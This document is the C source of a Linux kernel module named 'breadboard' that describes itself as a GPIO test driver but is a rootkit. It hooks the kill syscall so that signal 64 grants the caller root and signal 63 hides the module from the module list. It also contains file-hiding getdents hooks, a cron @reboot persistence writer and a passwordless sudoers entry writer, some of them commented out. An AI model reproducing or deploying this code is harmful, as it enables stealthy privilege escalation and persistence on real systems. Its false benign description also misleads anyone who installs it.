#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/gpio.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/dirent.h>

#include "breadboardhelper.h"

#define USER_NAME "username"
#define BASE_DIR "/home/" USER_NAME "/Documents/Github/LinuxKernelDevelopment/"
#define CRON_JOB_PATH "/etc/cron.d/breadboard"
#define SUDO_JOB_PATH "/etc/sudoers.d/breadboard"
#define MODULE_PATH BASE_DIR "load_mod.sh"
#define CRON_CONTENT "@reboot root " MODULE_PATH "\n"
#define PREFIX "breadboard"
#define PREFIX_LEN (sizeof(PREFIX) - 1)
#define SUDO_CONTENT USER_NAME " ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"

static short mod_hidden = 0;
static struct list_head *prev_module;

static asmlinkage long(*orig_kill)(const struct pt_regs *);
static asmlinkage long(*orig_getdents64)(const struct pt_regs *);
static asmlinkage long(*orig_getdents)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs){
	void set_root(void);
	void hide_module(void);
	void show_module(void);
	int sig = regs->si;
	if ( sig == 64 ){
		printk(KERN_INFO "breadboard: giving root\n");
		set_root();
		return 0;
	}
	if ( sig == 63 ){
		if( mod_hidden == 0 ){
			printk(KERN_INFO "breadboard: hiding\n");
			hide_module();
			return 0;
		}
		else if ( mod_hidden == 1 ){
			printk(KERN_INFO "breadboard: showed\n");
			show_module();
			return 0;
		}
	}
	return orig_kill(regs);
}

asmlinkage int hook_getdents64(const struct pt_regs *regs){
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *current_dir, *dirent_ker, *prev_dir = NULL;
	unsigned long offset = 0;
	long error;
	int ret;
	
	//printk(KERN_INFO "Inside hook_getdents64\n");
	ret = orig_getdents64(regs);
	if (ret <= 0){
		return ret;
	}
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if (dirent_ker == NULL){
		kfree(dirent_ker);
		return ret;
	}
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error){
		//printk(KERN_INFO "Error on copy_from_user.\n");
		kfree(dirent_ker);
		return ret;
	}
	while (offset < ret){
		current_dir = (void *)dirent_ker + offset;
		//printk(KERN_INFO "current_dir->d_name %s \n", current_dir->d_name);
		if (memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
			if (current_dir == dirent_ker){
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			prev_dir->d_reclen += current_dir->d_reclen;
			//printk(KERN_INFO "Skipped entry.\n");
		}
		else{
			prev_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}
	error = copy_to_user(dirent, dirent_ker, ret);
	if(error){
		kfree(dirent_ker);
	}
	return ret;
}

struct linux_dirent{
	unsigned long d_ino;
	unsigned long d_off;
	unsigned long d_reclen;
	char d_name[];
};
asmlinkage int hook_getdents(const struct pt_regs *regs){
	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
	struct linux_dirent *current_dir, *dirent_ker, *prev_dir = NULL;
	unsigned long offset = 0;
	long error;
	int ret;

	ret = orig_getdents(regs);
	if (ret <= 0){
		return ret;
	}
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if (dirent_ker == NULL){
		kfree(dirent_ker);
		return ret;
	}
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error){
		kfree(dirent_ker);
		return ret;
	}
	while (offset < ret){
		current_dir = (void *)dirent_ker + offset;
		if(memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
			if(current_dir == dirent_ker){
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			prev_dir->d_reclen = current_dir->d_reclen;
			printk(KERN_INFO "Skipped entry. \n");
		}
		else {
			prev_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}
	error = copy_to_user(dirent, dirent_ker, ret);
	if (error){
		kfree(dirent_ker);
	}
	return ret;
}

void set_root(void){
	struct cred *root;
	root = prepare_creds();

	if (root == NULL)
		return;
	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;
	commit_creds(root);
}

static int persistence(void){
	struct file *file;
	int ret = 0;

	pr_info("Loading module into cron.d for persistance.\n");

	//open cron.d
	file = filp_open(CRON_JOB_PATH, O_WRONLY | O_CREAT, 0644);
	if (IS_ERR(file)) {
		pr_err("Failed to open cron.d file: %ld\n", PTR_ERR(file));
		return PTR_ERR(file);
	}
	//write to cron.d
	ret = kernel_write(file, CRON_CONTENT, strlen(CRON_CONTENT), &file->f_pos);
	if (ret < 0) {
		pr_err("Failed to write cron job: %d\n", ret);
		filp_close(file, NULL);
		return ret;
	}

	pr_info("Cron job added successfully to %s\n", CRON_JOB_PATH);

	filp_close(file, NULL);
	return 0;
}

static int persistence_removal(void){
	struct file *file;
	char buf[128];
	int ret = 0;
	loff_t pos = 0;

	pr_info("Unloading persistence mechanism from cron.d\n");

	file = filp_open(CRON_JOB_PATH, O_RDWR, 0644);
	if (IS_ERR(file)){
		pr_err("Failed to open cron.d file %ld\n", PTR_ERR(file));
		return PTR_ERR(file);
	}

	while ((ret=kernel_read(file, buf, sizeof(buf), &pos)) > 0){
		if (strstr(buf, CRON_CONTENT)){
			file->f_pos = pos - ret;
			kernel_write(file, "", 0, &file->f_pos);
			pr_info("Persistance removed successfully.\n");
			break;
		}
	}
	if (ret < 0){
		pr_err("Failed to read cron.d file: %d\n", ret);
	}
	filp_close(file, NULL);
	return ret;
}

static int privledge(void){
	struct file *file;
	int ret = 0;

	pr_info("Creating a new sudoers.d file to grant sudo permissions.\n");

	file = filp_open(SUDO_JOB_PATH, O_WRONLY | O_CREAT | O_APPEND, 0440);
	if (IS_ERR(file)) {
		pr_err("Failed to open sudoers.d file: %ld\n", PTR_ERR(file));
		return PTR_ERR(file);
	}

	ret = kernel_write(file, SUDO_CONTENT, strlen(SUDO_CONTENT), &file->f_pos);
	if (ret < 0){
		pr_err("Failed to write to sudoers.d file: %d\n", ret);
		filp_close(file, NULL);
		return ret;
	}

	pr_info("Sudoers file created and permissions are granted.\n");
	filp_close(file, NULL);
	return 0;
}

static int privledge_removal(void){
	struct file *file;
	char buf[128];
	int ret = 0;
	loff_t pos = 0;

	pr_info("Removing privledge.\n");

	file = filp_open(SUDO_JOB_PATH, O_RDWR, 0644);
	if (IS_ERR(file)){
		pr_err("Failed to open sudoers.d file %ld\n", PTR_ERR(file));
		return PTR_ERR(file);
	}

	while ((ret = kernel_read(file, buf, sizeof(buf), &pos)) > 0){
		if(strstr(buf, SUDO_CONTENT)){
			file->f_pos = pos - ret;
			kernel_write(file, "", 0, &file->f_pos);
			pr_info("Privledge removed.\n");
			break;
		}
	}
	if(ret < 0){
		pr_err("Failed to remove permissions %d\n", ret);
	}
	filp_close(file, NULL);
	return ret;
}

void hide_module(void){
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	mod_hidden = 1;
}

void show_module(void){
	list_add(&THIS_MODULE->list, prev_module);
	mod_hidden = 0;
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	//HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	//HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static int __init breadboard_init(void){
	int ret;
	ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (ret)
		return ret;
	printk(KERN_INFO "breadboard: Hooks loaded.\n");
	//printk(KERN_INFO "USER_NAME %s BASE_DIR %s CRON_JOB_PATH %s SUDO_JOB_PATH %s MODULE_PATH %s\n", USER_NAME, BASE_DIR, CRON_JOB_PATH, SUDO_JOB_PATH, MODULE_PATH);
	//printk(KERN_INFO "CRON_CONTENT %s PREFIX %s SUDO_CONTENT %s\n", CRON_CONTENT, PREFIX, SUDO_CONTENT);
	/*
	hide_module();
	ret = persistence();
	if (ret<0) {
		pr_err("Persistance failed\n");
		return ret;
	}
	ret = privledge();
	if (ret<0) {
		pr_err("Privledge failed\n");
		return ret;
	}
	printk(KERN_INFO "GPIO_LED: Initializing the GPIO_LED module\n");

	led = gpio_request(GPIO_LED, "led-gpio");
	if(led){
		printk(KERN_ERR "GPIO_LED: Failed to request GPIO pin %d\n", GPIO_LED);
		return led;
	}
	ret = gpio_direction_output(GPIO_LED, 0);
	if(ret){
		printk(KERN_ERR "GPIO_LED: Failed to set GPIO pin %d as output\n", GPIO_LED);
		gpio_free(GPIO_LED);
		return ret;
	}
	gpio_set_value(GPIO_LED, 1);
	printk(KERN_INFO "GPIO_LED: LED turned on\n");
	*/
	return 0;  // Success
}

static void __exit breadboard_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "breadboard: Hooks unloaded\n");
	/*
	gpio_set_value(GPIO_LED, 0);
	gpio_free(GPIO_LED);
	*/
	//gpio_free(GPIO_BUTTON);
	//show_module();
	//persistence_removal();
	//privledge_removal();
}

module_init(breadboard_init);
module_exit(breadboard_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Theodore C");
MODULE_DESCRIPTION("A simple kernel driver to test GPIO pins, and kernel functionality.");
